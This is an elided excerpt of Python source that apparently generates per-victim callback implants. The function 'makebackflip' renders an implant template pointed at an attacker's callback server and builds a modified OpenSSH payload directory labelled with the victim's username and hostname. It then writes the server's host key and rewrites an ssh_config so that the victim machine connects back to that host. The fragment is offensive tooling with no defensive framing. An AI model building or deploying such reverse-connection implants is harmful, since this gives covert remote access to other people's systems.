...
def makebackflip(backflipServer, victim, args):
    ...
    print ("[*] callback host: %s" % backflipServer.fqdn)
    print ("[*] callback port: %s" % backflipServer.port)
    print ("[*] callback user: %s" % backflipServer.user)
    ...
    implant = implant_template.render({
        ...
        "backflipServer" : backflipServer.fqdn,
    ...
    # Create a new directory for this victim's payload using a copy of OpenSSH-template
        thisPayloadDir = Path(f"{backflipsBaseDir}/payloads/OpenSSH_{victim.username}-{victim.hostname}-{backflipServer.fqdn}-{str(uuid.uuid4())}")
        ...
        os.system(f"echo \"{backflipServer.fqdn} $(ssh-keyscan -p {backflipServer.port} -t ed25519 localhost 2>/dev/null | cut -d ' ' -f2-)\">{keysDir}/serverpub.pub")
        ...
        with open(f"{thisPayloadDir}/ssh_config", "r+") as f:
            ...
            f.seek(0)
            f.truncate()
            content = content.replace('backflipServer', backflipServer.fqdn)
